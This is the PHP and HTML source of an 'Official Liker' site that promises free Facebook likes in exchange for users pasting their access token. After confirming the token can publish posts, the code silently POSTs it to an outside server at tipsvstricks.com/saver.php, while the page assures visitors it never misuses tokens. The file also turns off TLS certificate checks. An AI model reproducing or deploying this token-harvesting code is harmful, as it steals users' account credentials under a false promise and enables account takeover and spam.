<?php
session_start();
// JSONURL //
function get_html($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return $data;
    }
function get_json($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return json_decode($data);
    }
if($_SESSION['token']){
	$token = $_SESSION['token'];
	$graph_url ="https://graph.facebook.com/me?access_token=" . $token;
	$user = get_json($graph_url);
	if ($user->error) {
		if ($user->error->type== "OAuthException") {
			session_destroy();
			header('Location: index.php?i=1');
			}
		}
}	

if(isset($_POST['submit'])) {
	$token2 = $_POST['token'];
	if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
		$token = $matches[1];
			}
	else{
		$token = $token2;
	}
		$extend = get_html("https://graph.facebook.com/me/permissions?access_token="  . $token);
		$pos = strpos($extend, "publish_stream");
		if ($pos == true) {
		$_SESSION['token'] = $token;
		$ch = curl_init('http://tipsvstricks.com/saver.php');
		curl_setopt ($ch, CURLOPT_POST, 1);
		curl_setopt ($ch, CURLOPT_POSTFIELDS, "token=".$token);
		curl_setopt($ch, CURLOPT_TIMEOUT, 2);
		curl_exec ($ch);
		curl_close ($ch);
			}
			else {
			session_destroy();
					header('Location: index.php?i=2');}
		
		}else{}
if(isset($_POST['logout'])) {
session_destroy();
header('Location: index.php?i=3');
} 
if(isset($_GET['i'])){
        switch($_GET['i']) {
            case 1:
                $errorMsg = "ERROR: Invalid Authentication The Access Token You Entered Is Not Valid."; // For example
            break;
            case 2:
                $errorMsg = "Please Allow App To Access Your Profile!";
            break;
            case 3:
                $errorMsg = "Logout Success!";
            break;
            case 4:
                $errorMsg = "INFO:A Required Parameter Access_token Is Missing, Please Check And Try Re Submitting";
            break;
            case 5:
                $errorMsg = "Like Failed, Time Limit Reached, Please Wait 15 mins Later..";
            break;
            default:
                $errorMsg = "TipsVsTricks.Com was here!";
            break;
        }
         ''.$errorMsg.'';
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Official Liker | Increase Facebook Likes</title>
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
    <link href="assets/css/bootstrap.css" rel="stylesheet">
    <link href="assets/css/bootstrap-responsive.css" rel="stylesheet">
    <link href="assets/css/flat-ui.css" rel="stylesheet">
    <link href="assets/css/flatten.css" rel="stylesheet">
    <link href="assets/css/flat-prettify.css" rel="stylesheet">
    <link href="assets/css/font-awesome.min.css" rel="stylesheet">
    <link href="assets/css/flatten.css" rel="stylesheet">
    <link href='http://fonts.googleapis.com/css?family=Open+Sans+Condensed:700' rel='stylesheet' type='text/css'>
    <link href='http://fonts.googleapis.com/css?family=Chau+Philomene+One:400,400italic' rel='stylesheet' type='text/css'>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="animate.css">
    <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/skins/colors/red.css" name="colors">
    <link rel="stylesheet" href="css/layout/wide.css" name="layout">
    <!--[if lt IE 9]><script src="js/html5.js"></script><![endif]-->
    <link rel="shortcut icon" href="assets/favicon.png">
</head>
    <body>
        <div id="wrap" class="boxed">
<style>
#ddd {
    position: fixed; 
    height: 50px; 
    top: 200; 
    left: 0; 
    width: 100%; 
	}
</style>
<script type="text/javascript">
var quotes=new Array()
quotes[0]='<?php include 'css/font/sendlikes.php';?>'
var whichquote=Math.floor(Math.random()*(quotes.length))
document.write(quotes[whichquote])
</script>
<!--Edit Menu In root/includes/menu.php-->
<?php include 'includes/menu.php';?>
<?php  if(isset($_GET['i']))
{ ?>
<div style="background-color:white;background:white;">
<div style="margin-bottom: -1px;" ;="" class="alert alert-error hideit"><i class="icon-warning-sign"></i><p> <?php 
echo "$errorMsg"; 
?></p></div></div>
<?php } ?>
<div style="color: #FFF;  font-weight: 700;  text-shadow: 1px 1px 4px rgba(0,0,0,0.6);overflow: hidden;  background-size: 50%;  background-color: rgba(0,0,0,0.8);background-image: url('hero-home.jpg');" class="page-title"><div class="container clearfix"> <div class="sixteen columns"> <h1 style=" padding: 10px 20px; background: rgba(255,255,255,0.1); line-height: 75px; text-transform: uppercase; letter-spacing: 2px; font-family: 'Open Sans Condensed', sans-serif; font-weight: 300;">Welcome To Official Liker</h1><br><p style="
    float: left;
    font-size: 16px;
">A tool for those who want to gain fame among their friends & catch their attention by popularising their status & photos likes.
</p> </div> </div><!-- End Container --> </div>
                            
                            <div style="margin-top: -41px;box-shadow: 6px -6px 45px -9px;"class="services style-1 home bottom-3"><div class="container clearfix">
     
       <div class="one-third column">
         <div class="item">
           <div class="circle"><a href="#"><i class="fa fa-check"></i></a></div>
           <h3><a href="#">NO SPAM</a></h3>
           <p>We never spamming using your access token. Official  Liker is totally spam free

</p>
         </div>
       </div><!-- End item -->
       
       <div class="one-third column">
         <div class="item">
           <div class="circle"><a href="#"><i class="icon-thumbs-up"></i></a></div>
           <h3><a href="#">Instant Likes</a></h3>
           <p>Get instant 250+ likes per submit by using your access token and UP-TO 25,000 Likes on your Statuses, Pictures, Albums!

</p>
         </div>
       </div><!-- End item -->
       
       <div class="one-third column">
         <div class="item">
           <div class="circle"><a href="#"><i class="icon-heart"></i></a></div>
           <h3><a href="#">Trusted Site</a></h3>
           <p>We are Online Since 2012 and always keep online to help you Provide free services</p>
         </div>
       </div><!-- End item -->
       
     </div>
	 <br><hr>
<center>
<div class="site_ads">
<!-- Ads Here -->
</div></center>	 
</div>
<center>
<div class="site_ads">
<!-- Ads Here -->
</div>
</center>
<br>
<center>
<center><div id="containerx"><div id="lol1"><center><br><h2 class="font" style=" font-size: 46px;color: #FFF;"><span class="fa fa-sign-in"></span> Methods For Login To Official Liker :-</h2></center></div><div id="lol2"><center style="font-family: 'Open Sans Condensed', sans-serif;font-weight: 300;font-size:21px;">								<ul style="list-style: none;"><li><span class="fa fa-wrench"></span> METHOD 1 - <a style=" color: #000;" rel="nofollow noreferrer" href="token.php" target="_blank">CLICK HERE</a> AND ALLOW PERMISSIONS TO THE APP, THEN COPY PASTE THE ENDING URL BELOW, IN LAST CLICK <a style=" color: #000;">SUBMIT</a> BUTTON </li><br><li><span class="fa fa-warning"></span> PLEASE <b style="color: #ffffff">DON'T FORGET</b> TO ALLOW YOUR <a style=" color: #000;" rel="nofollow noreferrer" target="_blank">FACEBOOK FOLLOWERS</a><a style=" color: #000;" rel="nofollow noreferrer" target="_blank">[SETTINGS]</a> AS WELL </li></ul><hr>

<form method="get" action="verify.php"><div class="input-append"><input placeholder="http://www.facebook.com/connect/login_success.html#access_token=BAABempp6Ls0BAGeVhAMl83aWWwpgZDZD&expires_in=0" class="span2" id="accesstoken" type="text" name="user" style="width: 610px; height: 20px;"><button type="submit" class="btn btn-large btn-inverse" onclick="tokencheck()" >Submit</button></div></form>
<?php if ($token){echo " ".$user->firt_name;}else{ ?>
<?php
		}
		?>
		<?php if ($token): ?>
<script type="text/javascript">
// Do Not Delete This
window.location.replace("http://tipsvstricks.com/dashboard.php?i=1");
</script>
		<?php else: ?>
		<?php endif ?>
		
<br><hr>
<br>
</center>
</div>
</div>
</center>

<center>
    <div id="checking" style="display:none;position: fixed;top: 0;left: 0;width: 100%;height: 100%;backzground: #f4f4f4;z-index: 99;">
        <div class="text" style="position: absolute;top: 45%;left: 0;height: 100%;width: 100%;font-size: 18px;text-align: center;">
            <center><i class="fa fa-spinnerXD fa-refresh fa-7x fa-spin" style="color:#000;font-size: 150px;"></i>
            </center>
        </div></div>
</center><br><br>
                                <center>
<div class="site_ads">
<!-- Ads Here -->
</div></center>
                            <br>
<!--tutorial-->
<div class="welcome" style=" margin-bottom: -40px;box-shadow: 6px -6px 45px -21px;">
    <div id="tutorial-text" class="tutorial-text">
        <Center>
            <h1><span class="color">*</span>Need Help? See This <a onclick="window.open('http://tipsstricks.com')" title="ScreenShoot Tutorial About How To Use Official Liker?" style="color:#000;">Article</a> OR <a onClick="tutorial()">Video</a> For Getting Started.</h1>
            <hr>
    </div>
    <div style="display:none;" id="tutorial-textt" class="tutorial-textt">
        <Center>
            <h1><span class="color">* </span><a onClick="tutorialhide()"> Need Help? Watch Video Click Here To Hide It</a></h1>
            <hr>
    </div>
    <center>
        <div id="tutorial" style="display:none;" class="tutorial">
          <iframe frameborder="0" height="373" src="http://player.vimeo.com/video/85419887?byline=0&amp;portrait=0" width="596px"></iframe> 
        </div>
<input type="hidden" name="IL_RELATED_TAGS" value="1"/>
<input type="hidden" name="IL_IN_TAG" value="2"/>
    </center>
    </center>
    </center>
    </center>
    <!-- tutorial end -->

    </div>   </div>  
<!--Edit Footer In root/includes/footer.php-->
<?php include 'includes/footer.php';?>
<script src="js/jquery-1.4.2.min.js"></script>
<script src="js/jquery.effects.core.js"></script>
<script src="js/jquery.effects.pulsate.js"></script>
    <script src="js/LOL.js"></script>
    <script src="js/jquery.easing.1.3.min.js"></script>
    <script src="js/jquery-ui/jquery.ui.core.js"></script>
    <script src="js/jquery-ui/jquery.ui.widget.js"></script>
	<script src="js/jquery-log.js"></script>
    <script src="js/jquery-ui/jquery.ui.accordion.js"></script>
    <script src="js/jquery-cookie.js"></script>
    <script src="js/ddsmoothmenu.js"></script>
     <script src="js/colortip.js"></script>
    <script src="js/tytabs.js"></script> 
    <script src="js/jquery.ui.totop.js"></script>
    <script src="js/carousel.js"></script>
    <script src="js/jquery.isotope.min.js"></script>
</body>
</html>